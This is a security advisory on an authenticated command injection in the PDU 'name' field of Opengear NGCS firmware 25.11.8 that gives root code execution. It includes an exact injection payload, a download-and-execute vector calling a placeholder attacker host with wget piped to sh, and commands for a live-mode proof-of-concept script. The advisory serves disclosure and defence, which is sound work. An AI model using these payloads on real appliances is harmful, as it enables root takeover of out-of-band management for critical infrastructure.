# Opengear NGCS Firmware 25.11.8 — PDU `name` Command Injection: Authenticated Administrator to Root RCE

## 1. Overview

Opengear (a Digi company, US) ships appliances the research record categorizes as **CII / OT console managers (cellular console gateways)** — the out-of-band management tier that keeps a serial path to infrastructure when the production network itself is down. They run Opengear **NGCS firmware**; this advisory covers **25.11.8**. The management API is `og-rest-api`, a Lua application served by nginx through a FastCGI worker. Critically it ships as **readable Lua source, not bytecode** — 128 `.lua` files exposing **371 routes** — so a full source-level audit was possible without reverse engineering compiled logic.

An authenticated **administrator** creates a PDU whose `name` contains a double quote. That string is stored and read back verbatim, concatenated inside a double-quoted shell command template, and handed to `io.popen()`. `io.popen()` runs its argument through `/bin/sh -c`, so the double quote closes the wrapper, a `;` ends the `ogpower` invocation, and everything after the separator executes. The FastCGI worker (`wsapi-fcgi@.service`) carries **no `User=` directive**, so systemd runs it as **uid 0** — the injected command runs as **root**.

The research ran in four stages, and the sections below follow that path: (1) **surface discovery** — the extracted `og-rest-api` tree was enumerated (128 Lua files / 371 routes) and shell-sink discovery identified `commands/PDUs.lua`, whose `PDUs.execute()` wraps `io.popen(command .. ' 2>&1')`; (2) **sink localization and reachability** — `getOutletCount()` was traced to `'/usr/bin/ogpower -n "' .. name .. '" system_info'` and the path from `POST /api/v2/pdus` walked step by step, including the `outlets`-omitted branch that selects auto-discovery and the `ls "/etc/ogpower/pdu/<method>"` gate that must succeed first; (3) **chain construction** — `validateJSON()` was confirmed to check `name` only for non-emptiness and `type == "string"`, storage (`addElem`) and readback (`getString`) confirmed raw, yielding the breakout `x";id>/tmp/m_opg;#`; (4) **dynamic verification** — the sink logic was faithfully replicated in Lua under `luajit` and driven with three inputs (VULN / CONTROL / BENIGN); the vulnerable input produced a marker containing `uid=0(root) gid=0(root) groups=0(root)`, the benign controls produced none, and an independent adversarial review converged.

## 2. Vulnerability Summary

- **Type**: OS command injection, CWE-78 (Improper Neutralization of Special Elements used in an OS Command). The record also tags CWE-20 (Improper Input Validation) — `name` is accepted with no character filter.
- **CVSS**: **8.8 High** — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`
- **Entry point / sink**: `POST /api/v2/pdus`, JSON field `pdu.name` → `commands/PDUs.lua` → `getOutletCount()` → `PDUs.execute()` → `io.popen(command .. ' 2>&1')` (i.e. `/bin/sh -c`), via the template `/usr/bin/ogpower -n "<name>" system_info`
- **Unescaped element**: `name` is wrapped in literal double quotes with **no escaping and no character filtering** anywhere along the path
- **Preconditions**: authenticated administrator (`auth_fn=Requester.has_admin_right`); the body must **omit** `outlets` so the auto-discovery branch is taken; the `ls "/etc/ogpower/pdu/<method>"` gate must succeed (it does on a device with drivers installed)
- **Execution identity / classification**: **uid=0 (root)**, because `wsapi-fcgi@.service` has no `User=` directive and systemd therefore defaults the unit to root. Classified **Target B** — authenticated administrator to root RCE; the unauthenticated variant (Target A) was assessed and found **not reachable** (section 4).

## 3. Product & Architecture

- **Vendor**: Opengear (Digi), US — **product role**: CII / OT console manager (cellular console gateway), an out-of-band management appliance
- **Firmware**: NGCS **25.11.8**; rootfs extracted from squashfs (sasquatch). **Platforms documented as affected**: `ogarmada` (ARM32), `ogquoll` (aarch64), `ogpuma` (x86-64) — the record states all three
### Attack surface

- **Management API**: `var/www/localhost/wsapi/og-rest-api/` — **128 `.lua` files, 371 routes, source rather than bytecode**
- **Runtime stack**: `nginx` → `wsapi-fcgi` (**port 9001**) → Lua (`og-rest-api`)
- **Service privilege**: `wsapi-fcgi@.service` has **no `User=` directive**, so systemd's default applies and the worker runs as **root**
- **Other services** noted during surface discovery (`salt`, `ttyd`, `wsapi-fcgi`, `beanstalkd`, `redis`) were found bound to `127.0.0.1` or otherwise authentication-guarded

## 4. Authentication Boundary

The route registration for this endpoint (`engine.lua:558`, `POST /api/v2/pdus` → `createPDU`) declares `auth_fn=Requester.has_admin_right`, so the attacker needs a valid **administrator** session, obtained via `POST /api/v2/sessions` with `{"username":"admin","password":"<admin-password>"}` returning `Set-Cookie: session_id=...`.

**Was Target A (unauthenticated) assessed? Yes, and it was ruled out.** The record documents a full-surface unauthenticated-reachability review of the 25.11.8 series concluding: **all 371 `og-rest-api` routes are guarded by an `auth_fn`**; the only pre-authentication functionality is session/login, which carries no shell sink; the non-HTTP in-house services (`salt`, `ttyd`, `wsapi-fcgi`, `beanstalkd`, `redis`) are either bound to `127.0.0.1` or authentication-guarded. **Unauthenticated RCE was judged not reachable**; this sink is a post-authentication path.

**Default credentials are deliberately excluded.** The record notes default-credential weaknesses (CWE-798, shipped default accounts) are a **separate disclosure and are not used as an RCE vector here**; the documented exploitation constraint is that the whole chain is HTTP/HTTPS with **no MITM** and **no default-credential vector**. It also lists the conditions that would **re-escalate this to Target A at CVSS 9.8**: (a) a future unauthenticated route reaching `PDUs.execute` / `ogpower`; (b) an unremediated default-credential deployment, collapsing `PR:L` to `PR:N`; (c) end-to-end dynamic reproduction on full-device HTTP emulation.

## 5. Root-Cause Analysis

### Sink identification (5.1): the ogpower command template

```lua
-- PDUs.lua:14 — io.popen, i.e. the command string goes through sh -c
function PDUs.execute(command)
    local f = io.popen(command ..' 2>&1')
    local output = f:read"*a"
    return output
end

-- PDUs.lua:22 — getOutletCount; taken when outlets is NOT provided
local function getOutletCount(driver, method, name, pduIndex, outlets, errors)
    if not common.jsonNullOrNil(outlets) then
        local count = #outlets
        if count > 0 then return count end          -- outlets supplied => short-circuit
    end
    local cmd = 'ls "/etc/ogpower/pdu/' .. method ..'"'   -- method is enum-locked, not injectable
    local output = PDUs.execute(cmd)
    if common.jsonNullNilOrEmpty(output) or string.find(output, "ERROR") then
        return -1                                     -- ls gate fails => sink not reached
    end
    cmd = '/usr/bin/ogpower -n "' .. name .. '" system_info'   -- SINK: name double-quoted, unescaped
    output = PDUs.execute(cmd)                         -- io.popen(cmd..' 2>&1') -> sh -c
    ...
end
```

The root cause is that last concatenation: `name` is placed inside literal double quotes but is **neither escaped nor character-filtered**. `method` is *not* the problem — it is enum-locked to `powerman`/`shell`/`snmp`.

### Source identification

The attacker-controlled value is the PDU `name` field in the `POST /api/v2/pdus` request body. As the data-flow table below records, it is read by `validateJSON` with only a null/empty and `type == "string"` check (`PDUs.lua:319`) and stored raw by `addPduSettings` (`PDUs.lua:1011`). The subsections that follow explain why nothing neutralizes that value between storage and the sink.

### 5.2 A sanitizer exists in the code base and is not called here

`common.shlex_quote` exists at **`common.lua:590`** and **is** used by other modules (`PortAutoDiscover`, `AutoResponseStatus`), but it is **not** used by the `ogpower` sink in `PDUs.lua`. That makes this an omission-class defect rather than a design choice: the safe primitive was available to the author and simply was not applied at this call site.

### 5.3 No downstream neutralization

`/usr/bin/ogpower` is a **Python wrapper** that internally uses `subprocess.run(command_list, ...)` — an argument **list**, with **no shell** — so it performs no second shell parse. The injection lives **entirely at the Lua `io.popen` layer**, and no later stage can neutralize it.

### Data flow (5.4): HTTP in, root shell out, no sanitization anywhere

| # | Location | Behaviour |
|---|----------|-----------|
| 1 | `engine.lua:558` | `POST /api/v2/pdus` → `createPDU`; `auth_fn=Requester.has_admin_right` (administrator required) |
| 2 | `PDUs.lua:319` `validateJSON` | `name` checked **only** for `jsonNullNilOrEmpty` + `type == "string"` — **no character filter**; `method` validated against enum `powerman`/`shell`/`snmp` |
| 3 | `PDUs.lua:1011` `addPduSettings` | `pdu:addElem("name", body.pdu.name)` — **stored raw** (`addElem` → `ogconfig.cfg_add_mapelem`, no sanitization) |
| 4 | `createPDU` | `config:commit()` — persisted to configuration |
| 5 | `PDUs.lua:1302` `createPDU` | `discoverAndConfigureOutlets(config, pduElem, body.pdu.outlets, errors)` |
| 6 | `PDUs.lua:64` `discoverAndConfigureOutlets` | `local name = pduElem:getString("name")` — **read back raw** (`getString` performs no transformation) |
| 7 | `PDUs.lua:77` → `:22` `getOutletCount` | `ogpower -n "<name>" system_info` → `PDUs.execute` → `io.popen` → `/bin/sh -c` |

Between step 1 and step 7 there is **not a single transformation** of `name` — validated for type only, stored as supplied, read back as supplied.

### Reachability (5.5): precondition — omit `outlets`

`outlets` is **optional** in `validateJSON`. Supplying a non-empty `outlets` array makes `getOutletCount` count them and **short-circuit**, never reaching the sink; omitting it falls through to auto-discovery and to the `ogpower` command. One gate precedes the sink: `ls "/etc/ogpower/pdu/<method>"` must return non-empty output without `ERROR`. On a real device this is naturally satisfied — the record documents that `/etc/ogpower/pdu/{shell,powerman,snmp}/` all contain driver `.conf` files, so the gate passes for all three driver methods.

## 6. Exploit Chain Construction

**Step 1 — authenticate as administrator.** `POST /api/v2/sessions` with `{"username":"admin","password":"<admin-password>"}` returns `Set-Cookie: session_id=...`.

**Step 2 — create the PDU, omitting `outlets`.** `POST /api/v2/pdus` with the session cookie and a body whose `name` closes the double quote, appends the command after a `;`, and comments out the template tail with `#`. The `snmp` sub-object exists only to satisfy `validateSNMP`, which checks `address` as a non-empty string with **no IP or hostname validation**:

```json
{"pdu":{"name":"x\";id>/tmp/m_opg;#","driver":"apc","method":"snmp","snmp":{"version":"2c","address":"1.2.3.4","community":"public"}}}
```

**Step 3 — the string `io.popen` builds and hands to `/bin/sh -c`:**

```
/usr/bin/ogpower -n "x";id>/tmp/m_opg;#" system_info 2>&1
```

The shell parses four things: `/usr/bin/ogpower -n "x"` (ogpower invoked with argument `x`; the attacker's `"` closed the wrapper) · `;` (command separator) · `id>/tmp/m_opg` (**the injected command executes**, output redirected to a marker file) · `#` (comments out the trailing ` system_info 2>&1`, so leftover template text causes no syntax error). Because `wsapi-fcgi@.service` has no `User=` directive, that command runs as **uid=0**. **Step 4 — arbitrary code execution:** substituting any command yields full RCE; the record documents the complete vector form as `x";wget ATTACKER -O -|sh;#` in the `name` field of an HTTP POST body, i.e. download-and-execute as root over the management interface.

## 7. PoC Usage

A self-contained, standard-library-only Python 3 PoC ships at `exploit/opengear_ngcs_pdu_name_cmd_injection_rce.py` in two modes — `--selftest` replicates the firmware `validateJSON` + `getOutletCount` command construction and prints the exact `io.popen` string the device would run (no network needed); `--target` sends the live exploit to an authorized device (administrator credentials required, then check the marker file on the device for `uid=0(root)`):

```bash
python3 exploit/opengear_ngcs_pdu_name_cmd_injection_rce.py --selftest
python3 exploit/opengear_ngcs_pdu_name_cmd_injection_rce.py \
    --target 127.0.0.1 --username admin --password <admin-password> \
    --command 'id>/tmp/m_opg_live'
```

Recorded `--selftest` output (intermediate shell-parsing lines elided):

```
=== Opengear NGCS 25.11.8 selftest: PDUs.lua pdu.name command injection ===
Injected pdu.name        : 'x";id>/tmp/m_opg_selftest;#'
validateJSON name passes : True
method enum-locked       : True
outlets omitted          : True
io.popen command string  :
    /usr/bin/ogpower -n "x";id>/tmp/m_opg_selftest;#" system_info 2>&1
...
Result: the injected command executes as uid=0(root),
        because wsapi-fcgi@.service has no User= directive.
...
selftest PASS
```

Use only on systems you are authorized to test.

## 8. Verification Evidence

**The verification environment must be stated plainly.** Full-device emulation of the live chain was **not performed**: emulating nginx + `wsapi-fcgi` + Lua on aarch64/ARM32 was judged too complex, so a **faithful replication of the sink logic** was used instead (the same approach as prior findings in this research programme). It ran on a cloud Linux host (native x86-64) under **`luajit 2.1.ROLLING`**, against the extracted firmware source `.../rootfs/var/www/localhost/wsapi/og-rest-api/commands/PDUs.lua` (md5 `d9e0530285f04915c6bf18dde5287e65`). The replication script `/tmp/c13_pdu.lua` mirrors `PDUs.execute` (line 14) and `getOutletCount` (line 22), including the `outlets` short-circuit, the `ls` gate, and the `io.popen` sink:

```lua
local function pdu_execute(command)
    local f = io.popen(command .. " 2>&1")   -- mirrors PDUs.execute
    local output = f:read"*a"; f:close(); return output
end

local function getOutletCount(driver, method, name, pduIndex, outlets, errors)
    if not (outlets == nil) then
        local count = #outlets
        if count > 0 then return count end           -- outlets supplied => short-circuit
    end
    local cmd = "ls \"/etc/ogpower/pdu/" .. method .."\""  -- ls gate (method enum, safe)
    local output = pdu_execute(cmd)
    if isempty(output) or string.find(output, "ERROR") then return -1 end
    cmd = "/usr/bin/ogpower -n \"" .. name .. "\" system_info"  -- SINK
    output = pdu_execute(cmd)
    return 0
end
```

The `ls` gate precondition was established by simulating an installed driver (`mkdir -p /etc/ogpower/pdu/shell; touch /etc/ogpower/pdu/shell/driver_example`); on a real device that directory already holds driver `.conf` files, so the gate passes naturally. **Three-arm controlled run — actual stdout:**

```
VULN marker:	uid=0(root) gid=0(root) groups=0(root)
CONTROL marker:	MISSING
BENIGN marker:	MISSING
```

| Arm | `pdu.name` | `io.popen` command string | Marker file | Marker content |
|-----|-----------|---------------------------|-------------|----------------|
| **VULN** | `x";id>/tmp/m_opg_v;#` | `/usr/bin/ogpower -n "x";id>/tmp/m_opg_v;#" system_info 2>&1` | `/tmp/m_opg_v` (39 bytes, root:root) | `uid=0(root) gid=0(root) groups=0(root)` |
| **CONTROL** | `normalname` | `/usr/bin/ogpower -n "normalname" system_info 2>&1` | does not exist | — (no injection characters, no marker) |
| **BENIGN** | `benign` | `/usr/bin/ogpower -n "benign" system_info 2>&1` | does not exist | — |

```
$ ls -la /tmp/m_opg_v /tmp/m_opg_c /tmp/m_opg_b
-rw-r--r-- 1 root root 39 Aug 24 20:31 /tmp/m_opg_v
ls: cannot access '/tmp/m_opg_c': No such file or directory
ls: cannot access '/tmp/m_opg_b': No such file or directory
```

The VULN marker is 39 bytes owned `root root`; the two control markers were never created. That is the false-positive control — benign names produce no execution, only the quote-bearing payload does. The replication process ran as root, corresponding to the device's `wsapi-fcgi@.service` having no `User=` directive.

**Independent adversarial review.** The primary review tool was unavailable, so two independent passes ran as a fallback and converged: a **re-analysis pass** (independent re-reading of the source) returned **CONFIRMED, 0.96**, confirming no sanitization from `name` to sink, raw `addElem`/`getString` storage and readback, the `method` enum lock, `ls`-gate reachability, the `"` breakout, and `wsapi-fcgi` running as root; a **refutation pass** across seven falsification angles returned **NOT REFUTED, 0.95** — F1 no `name` sanitization (`shlex_quote` exists but unused), F2 sink reachable (`outlets` may be omitted), F3 the `"` breakout empirically yields `uid=0`, F4 `method` enum-locked, F5 `wsapi-fcgi` is root, F6 different file from the separate CellFW finding hence independent, F7 `ogpower` uses a subprocess argument list with no shell re-parse. **Verification status: dynamic verification PASSED**, with the recorded limitation that verification was by faithful sink replication on a cloud x86-64 host under `luajit` — **not** full-device emulation and **not** end-to-end HTTP replay against physical hardware.

## 9. Affected Scope

This entry is a **cross-family merged entry**. The merge basis, exactly as documented, is that the vulnerable source file `commands/PDUs.lua` is **byte-for-byte identical across the Opengear firmware families** — md5 `d9e0530285f04915c6bf18dde5287e65`, spanning the three architectures ARM32 / aarch64 / x86-64 — and so constitutes a **single code defect**, merged into one entry rather than counted once per platform. The record enumerates the affected product series as:

| Product series | Platform / architecture | `PDUs.lua` md5 |
|----------------|-------------------------|----------------|
| CM80xx (CM8000) | `ogquoll` / aarch64 | `d9e0530285f04915c6bf18dde5287e65` |
| CM81xx (CM8100) | `ogarmada` / ARM32 | `d9e0530285f04915c6bf18dde5287e65` |
| OM12xx (OM1200) | `ogpuma` / x86-64 | `d9e0530285f04915c6bf18dde5287e65` |
| OM13xx (OM1300) | `ogquoll` / aarch64 | `d9e0530285f04915c6bf18dde5287e65` |
| OM22xx (OM2200) | `ogpuma` / x86-64 | `d9e0530285f04915c6bf18dde5287e65` |

All five run the Opengear `og-rest-api` stack (nginx → `wsapi-fcgi` → Lua) on firmware **25.11.8**. **Scope boundaries stated honestly:** those five series are what the record enumerates, and although its merge statement asserts the file is byte-identical "across all series" of the firmware, **no per-series extraction provenance is documented for anything other than the CM8100 image** (`.../opengear-cm8100-firmware/_extract/rootfs`), the source cited for that md5 — so beyond the five enumerated series and that tested build, **the affected set is not enumerated in our research record**, and we claim no model list larger than what is tabulated. Firmware versions other than **25.11.8** are not documented as tested, and whether earlier or later NGCS releases carry the same `PDUs.lua` is **not documented in the research record**. Exploitation requires an administrator account: the record relies on **no default-credential vector**, and deployments still on shipped credentials would raise the score (section 4) but constitute a separate issue.

**Independence from a related Opengear finding.** A second, separate Opengear 0-day exists in the same firmware family — a carrier-code injection in `CellFwUpgrade.lua`. This advisory does **not** cover it. The two differ in every dimension the record checks: different file (`PDUs.lua`, md5 `d9e0530285f04915c6bf18dde5287e65`, versus `CellFwUpgrade.lua`, md5 `0eb0b3f8...`), different sink (`io.popen` running `ogpower` versus `os.execute` running `setsid cell-fw-update`), different parameter (`pdu.name` versus `carrier_code`), different code path. They are **independent vulnerabilities** and are not merged.

## 10. Security Impact

An Opengear appliance is not an ordinary IT asset; it is the **out-of-band management tier**, deliberately wired to other equipment's serial consoles so it stays reachable when production networking, monitoring, and remote access have all failed. That positioning multiplies the impact of root on the appliance itself.

- **Execution identity is uid 0 (root).** Every injected command runs with full privileges over the appliance — its stored console/PDU configuration, its credentials, its cellular and serial interfaces.
- **Control of the last-resort management path.** Root on a console manager means control of **every attached device's serial console**. The appliance is the recovery channel for the rest of the estate; whoever owns the recovery channel owns a path into each device it terminates, and that path is **out of band of normal monitoring** — the production-side sensors, agents, and logging that would usually detect compromise do not sit on the OOB segment.
- **Persistence via the management plane.** The vulnerability is reached through a legitimate provisioning operation, so the malicious PDU entry is **written to configuration and committed** (`config:commit()`). The foothold is durable configuration state, not a transient process, and it survives reboots.
- **Critical-infrastructure and OT exposure.** The record categorizes the product as a **CII / OT console manager**. Deployments in that class commonly reach substations, plant floors, and other environments where the serial path *is* the control path, putting a root foothold adjacent to operational technology.
- **Detection asymmetry and low barrier.** Exploit traffic is ordinary authenticated management-API traffic (login, then create a PDU), indistinguishable in shape from legitimate administration; detection depends on noticing an unusual `name` value the product does not restrict. The barrier is a single administrator credential — no race condition, no memory corruption, no non-default configuration, hence Complexity Low — and Confidentiality, Integrity, and Availability are all High.

## 11. Mitigation

**Vendor:** (1) **quote at the sink** — route `name` through the existing `common.shlex_quote` (`common.lua:590`) before concatenation, exactly as `PortAutoDiscover` and `AutoResponseStatus` already do; the safe primitive is present and this call site omitted it. (2) **Stop building shell strings** — `PDUs.execute` uses `io.popen(command .. ' 2>&1')`, inherently shell-mediated; spawn with an argv list instead so metacharacters in `name` have no interpreter to act on. (3) **Validate `name` at the boundary** — `validateJSON` checks only non-emptiness and `type == "string"`, so add a character policy rejecting shell metacharacters and quotes for any value destined for a command line. (4) **Audit every other `io.popen` / `os.execute` call site** in `og-rest-api` for the same omission pattern. (5) **Drop privileges on the worker** — `wsapi-fcgi@.service` should carry an explicit `User=` with a dedicated least-privilege account, since the root default is what turns command injection into full appliance compromise.

**Operator hardening pending a vendor fix:** (6) **restrict the management interface** — keep `og-rest-api` off untrusted segments and front it with a jump host or VPN, treating every administrator account as holding root on the appliance, because through this flaw it does. (7) **Audit PDU configuration** — inspect stored PDU `name` values for shell metacharacters (`"`, `;`, `` ` ``, `$(`, `#`, `|`, `&`, `<`, `>`); a PDU entry is committed persistent configuration, so a malicious one survives reboots. (8) **Enforce strong, unique, rotated administrator credentials** and remove or change shipped defaults so the `PR:N` escalation path of section 4 is unavailable. (9) **Monitor `/api/v2/pdus` POST activity** for creations not corresponding to real power-management work, and for `session_id` logins from unexpected addresses.

## 12. CWE & CVSS

- **CWE-78** — Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection'): `pdu.name` reaches `io.popen` (i.e. `/bin/sh -c`) wrapped in unescaped double quotes.
- **CWE-20** — Improper Input Validation: `validateJSON` accepts `name` with only a non-empty `type == "string"` check, no character filter on a value later concatenated into a shell command.
- **CVSS v3.1 Base Score: 8.8 (High)** — vector `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`. AV:N over the management API · AC:L no special conditions (omit `outlets`, include a `"`) · PR:L authenticated administrator required (`PR:N` would apply if default credentials remain, raising the score to 9.8; not asserted here) · UI:N no user interaction · S:U impact confined to the vulnerable appliance · C:H/I:H/A:H commands execute as **uid=0 (root)** on the out-of-band management appliance.
- **CVE**: pending (0-day, pre-disclosure). **Target classification**: **B** — authenticated administrator to root RCE; Target A (unauthenticated) assessed and **not reachable** on firmware 25.11.8.

---
*Research and writeup: 0day Rubbish Research Team · disclosure@0day-rubbish.com · batch-11. Disclosure status is tracked in DISCLOSURE-STATUS.md.*
